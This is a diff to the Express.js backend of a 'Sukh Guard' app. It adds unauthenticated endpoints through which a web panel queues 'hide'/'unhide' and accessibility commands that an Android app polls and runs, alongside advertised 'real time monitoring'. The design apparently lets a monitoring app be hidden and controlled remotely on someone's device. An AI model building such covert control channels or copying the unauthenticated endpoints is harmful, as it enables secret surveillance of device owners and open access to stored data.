@@ -19,6 +19,9 @@ app.use(express.static('website'));
 // Data storage file
 const DATA_FILE = './app_data.json';
 
+// Commands storage file - NEW
+const COMMANDS_FILE = './commands_data.json';
+
 // Initialize data file if not exists
 const initializeDataFile = () => {
     if (!fs.existsSync(DATA_FILE)) {
@@ -32,6 +35,22 @@ const initializeDataFile = () => {
         };
         fs.writeFileSync(DATA_FILE, JSON.stringify(initialData, null, 2));
         console.log('✅ Data file created successfully');
+    }
+};
+
+// Initialize commands file if not exists - NEW
+const initializeCommandsFile = () => {
+    if (!fs.existsSync(COMMANDS_FILE)) {
+        const initialCommands = {
+            hide_commands: [],
+            accessibility_commands: [],
+            stats: {
+                total_hide_commands: 0,
+                total_accessibility_commands: 0
+            }
+        };
+        fs.writeFileSync(COMMANDS_FILE, JSON.stringify(initialCommands, null, 2));
+        console.log('✅ Commands file created successfully');
     }
 };
 
@@ -57,8 +76,31 @@ const writeData = (data) => {
     }
 };
 
-// Initialize data file on server start
+// Read commands from file - NEW
+const readCommands = () => {
+    try {
+        const commands = fs.readFileSync(COMMANDS_FILE, 'utf8');
+        return JSON.parse(commands);
+    } catch (error) {
+        console.error('Error reading commands file:', error);
+        return { hide_commands: [], accessibility_commands: [], stats: { total_hide_commands: 0, total_accessibility_commands: 0 } };
+    }
+};
+
+// Write commands to file - NEW
+const writeCommands = (commands) => {
+    try {
+        fs.writeFileSync(COMMANDS_FILE, JSON.stringify(commands, null, 2));
+        return true;
+    } catch (error) {
+        console.error('Error writing commands file:', error);
+        return false;
+    }
+};
+
+// Initialize data files on server start
 initializeDataFile();
+initializeCommandsFile();
 
 // 📱 MOBILE APP ROUTES
 
@@ -153,6 +195,176 @@ app.get('/api/user/:id', (req, res) => {
     }
 });
 
+// 🎯 NEW: HIDE/UNHIDE DEVICE ENDPOINT
+app.post('/api/hide-device', (req, res) => {
+    try {
+        const { device_id, action } = req.body;
+        
+        console.log(`🎯 Hide request: ${action} for device: ${device_id}`);
+        
+        if (!device_id || !action) {
+            return res.status(400).json({
+                success: false,
+                message: 'Device ID and action required'
+            });
+        }
+        
+        // Commands file mein save karo
+        const commands = readCommands();
+        const newCommand = {
+            id: Date.now(),
+            device_id: device_id,
+            action: action, // 'hide' or 'unhide'
+            type: 'hide_command',
+            status: 'pending',
+            created_at: new Date().toISOString(),
+            executed_at: null
+        };
+        
+        commands.hide_commands.push(newCommand);
+        commands.stats.total_hide_commands = commands.hide_commands.length;
+        
+        if (writeCommands(commands)) {
+            console.log(`✅ Hide command saved: ${action} for ${device_id}`);
+            res.json({
+                success: true,
+                message: `${action} command received for ${device_id}`,
+                command_id: newCommand.id,
+                device_id: device_id,
+                action: action,
+                timestamp: new Date().toISOString()
+            });
+        } else {
+            res.status(500).json({
+                success: false,
+                message: 'Failed to save command'
+            });
+        }
+        
+    } catch (error) {
+        console.error('❌ Hide device error:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Server error'
+        });
+    }
+});
+
+// 🎯 NEW: ACCESSIBILITY COMMAND ENDPOINT
+app.post('/api/accessibility-command', (req, res) => {
+    try {
+        const { device_id, action, source } = req.body;
+        
+        console.log(`♿ Accessibility command: ${action} for device: ${device_id}`);
+        
+        if (!device_id || !action) {
+            return res.status(400).json({
+                success: false,
+                message: 'Device ID and action required'
+            });
+        }
+        
+        // Commands file mein save karo
+        const commands = readCommands();
+        const newCommand = {
+            id: Date.now(),
+            device_id: device_id,
+            action: action, // 'hide' or 'unhide'
+            type: 'accessibility_command',
+            source: source || 'web_panel',
+            status: 'pending',
+            created_at: new Date().toISOString(),
+            executed_at: null
+        };
+        
+        commands.accessibility_commands.push(newCommand);
+        commands.stats.total_accessibility_commands = commands.accessibility_commands.length;
+        
+        if (writeCommands(commands)) {
+            console.log(`✅ Accessibility command saved: ${action} for ${device_id}`);
+            res.json({
+                success: true,
+                message: `Accessibility ${action} command received`,
+                command_id: newCommand.id,
+                device_id: device_id,
+                action: action,
+                type: 'accessibility',
+                timestamp: new Date().toISOString()
+            });
+        } else {
+            res.status(500).json({
+                success: false,
+                message: 'Failed to save accessibility command'
+            });
+        }
+        
+    } catch (error) {
+        console.error('❌ Accessibility command error:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Server error'
+        });
+    }
+});
+
+// 🎯 NEW: CHECK FOR PENDING COMMANDS (Android app ke liye)
+app.post('/api/check-commands', (req, res) => {
+    try {
+        const { device_id, user_id } = req.body;
+        
+        console.log(`🔍 Checking commands for device: ${device_id}`);
+        
+        const commands = readCommands();
+        
+        // Device ke liye pending commands dhundho
+        const pendingHideCommands = commands.hide_commands.filter(cmd => 
+            cmd.device_id === device_id && cmd.status === 'pending'
+        );
+        
+        const pendingAccessibilityCommands = commands.accessibility_commands.filter(cmd => 
+            cmd.device_id === device_id && cmd.status === 'pending'
+        );
+        
+        const allPendingCommands = [...pendingHideCommands, ...pendingAccessibilityCommands];
+        
+        if (allPendingCommands.length > 0) {
+            // Pehla pending command return karo
+            const nextCommand = allPendingCommands[0];
+            
+            // Command ko executed mark karo
+            nextCommand.status = 'executed';
+            nextCommand.executed_at = new Date().toISOString();
+            writeCommands(commands);
+            
+            console.log(`🎯 Sending command to device: ${nextCommand.action}`);
+            
+            res.json({
+                has_command: true,
+                action: nextCommand.action,
+                type: nextCommand.type,
+                device_id: device_id,
+                command_id: nextCommand.id,
+                timestamp: new Date().toISOString()
+            });
+        } else {
+            res.json({
+                has_command: false,
+                action: 'none',
+                device_id: device_id,
+                message: 'No pending commands',
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+    } catch (error) {
+        console.error('❌ Check commands error:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Server error'
+        });
+    }
+});
+
 // 🌐 WEBSITE ROUTES
 
 // Website ke liye all users
@@ -195,6 +407,28 @@ app.get('/api/stats', (req, res) => {
     res.json(data.stats);
 });
 
+// 🎯 NEW: COMMANDS STATS ROUTE
+app.get('/api/commands-stats', (req, res) => {
+    const commands = readCommands();
+    res.json(commands.stats);
+});
+
+// 🎯 NEW: GET ALL COMMANDS (Admin ke liye)
+app.get('/api/all-commands', (req, res) => {
+    const commands = readCommands();
+    
+    const allCommands = [
+        ...commands.hide_commands.map(cmd => ({ ...cmd, command_type: 'hide' })),
+        ...commands.accessibility_commands.map(cmd => ({ ...cmd, command_type: 'accessibility' }))
+    ].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+    
+    res.json({
+        commands: allCommands,
+        total: allCommands.length,
+        stats: commands.stats
+    });
+});
+
 // 🎯 WEBSITE PAGES
 
 // Main website dashboard
@@ -216,18 +450,23 @@ app.get('/admin', (req, res) => {
 app.get('/api/docs', (req, res) => {
     res.json({
         message: 'Sukh Guard API Documentation',
-        version: '1.0',
+        version: '2.0', // Version update kiya
         environment: process.env.NODE_ENV || 'development',
         endpoints: {
             mobile: {
                 'POST /api/register': 'Register new user',
                 'POST /api/website/app-data': 'Save app data',
-                'GET /api/user/:id': 'Get user data'
+                'GET /api/user/:id': 'Get user data',
+                'POST /api/check-commands': 'Check for pending commands', // NEW
+                'POST /api/hide-device': 'Hide/unhide device', // NEW
+                'POST /api/accessibility-command': 'Accessibility command' // NEW
             },
             website: {
                 'GET /api/website/users': 'Get all users',
                 'GET /api/website/app-data': 'Get all app data',
-                'GET /api/stats': 'Get statistics'
+                'GET /api/stats': 'Get statistics',
+                'GET /api/commands-stats': 'Get commands statistics', // NEW
+                'GET /api/all-commands': 'Get all commands' // NEW
             },
             pages: {
                 'GET /web': 'Website Dashboard',
@@ -245,17 +484,22 @@ app.get('/api/docs', (req, res) => {
 app.get('/', (req, res) => {
     res.json({
         message: '🚀 Sukh Guard Backend Server Running!',
-        version: '1.0',
+        version: '2.0', // Version update kiya
         environment: process.env.NODE_ENV || 'development',
         port: PORT,
         storage: 'JSON File',
+        features: {
+            hide_commands: '✅ Available',
+            accessibility_commands: '✅ Available',
+            real_time_monitoring: '✅ Available'
+        },
         website: {
             dashboard: 'https://' + req.get('host') + '/web',
             admin: 'https://' + req.get('host') + '/admin'
         },
         endpoints: {
-            mobile: ['/api/register', '/api/website/app-data', '/api/user/:id'],
-            website: ['/api/website/users', '/api/website/app-data'],
+            mobile: ['/api/register', '/api/website/app-data', '/api/user/:id', '/api/hide-device', '/api/accessibility-command', '/api/check-commands'],
+            website: ['/api/website/users', '/api/website/app-data', '/api/commands-stats', '/api/all-commands'],
             stats: ['/api/stats'],
             pages: ['/web', '/dashboard', '/admin', '/health']
         }
@@ -267,7 +511,7 @@ app.use((req, res) => {
     res.status(404).json({
         error: 'Endpoint not found',
         available_endpoints: {
-            api: ['/api/register', '/api/website/app-data', '/api/stats', '/health'],
+            api: ['/api/register', '/api/website/app-data', '/api/stats', '/api/hide-device', '/api/accessibility-command', '/api/check-commands', '/health'],
             pages: ['/web', '/dashboard', '/admin', '/api/docs']
         }
     });
@@ -283,5 +527,6 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`❤️  Health Check: http://localhost:${PORT}/health`);
     console.log(`📚 API Docs: http://localhost:${PORT}/api/docs`);
     console.log(`💾 Data Storage: ${DATA_FILE}`);
-    console.log(`\n✅ Server ready for production!`);
+    console.log(`🎯 Commands Storage: ${COMMANDS_FILE}`);
+    console.log(`\n✅ Server Version 2.0 - Hide/Unhide Features Ready!`);
 });
